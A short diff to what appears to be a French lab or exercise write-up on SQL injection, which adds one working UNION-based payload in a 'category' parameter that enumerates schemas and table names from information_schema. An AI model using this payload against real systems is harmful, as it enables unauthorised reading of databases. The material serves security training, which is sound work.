@@ -2,6 +2,8 @@
 Les attaques par injection sql laissent la possibilité de récupérer des données qui ne sont pas censées être vues.
 Dans cet exercices il y a quelques étapes à effectuer afin de tout récuperer.
 Tout d'abord
+
+category=Home' union select table_schema || '~'|| table_name,1 from information_schema.tables order by name;--
 """
 
 
